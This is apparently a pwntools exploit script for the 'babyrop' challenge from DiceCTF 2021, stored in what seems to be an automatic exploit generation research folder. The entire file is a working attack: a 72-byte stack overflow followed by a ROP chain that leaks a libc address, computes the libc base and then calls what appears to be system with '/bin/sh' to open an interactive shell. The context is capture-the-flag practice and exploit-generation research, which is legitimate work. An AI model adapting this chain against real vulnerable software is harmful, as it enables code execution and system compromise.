from pwn import p64, u64, p32, u32
import pwn
import sys
        
pwn.context.log_level = "debug"
pwn.context.timeout = 20
p = pwn.process("/home/yuge/Documents/ACBEG/binaries/bofaeg_challenges/10_dicectf2021_babyrop/dicectf2021_babyrop")
pwn.gdb.attach(p)
p.recvuntil(b'Your name: ')
payload = b"\x00" * 72
payload += p64(0x40101a) + p64(0x4011ca) + p64(0x0) + p64(0x1) + p64(0x1) + p64(0x403fe8) + p64(0x8) + p64(0x404018) + p64(0x4011b0) + b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00' + p64(0x4011d3) + p64(0x404880) + p64(0x401040) + p64(0x40111d) + p64(0x404878) + p64(0x40116a)
payload += b"\n"
p.send(payload)
libc_base = u64(p.recv()[0:6].ljust(8,b'\x00')) + -0x21ba0
pwn.log.success('libc_base:' + hex(libc_base))
payload = b""
payload += p64(0x4011d3) + p64(libc_base + 0x1b3d88) + p64(libc_base + 0x4f420)
payload += b"\n"
p.send(payload)
p.interactive()
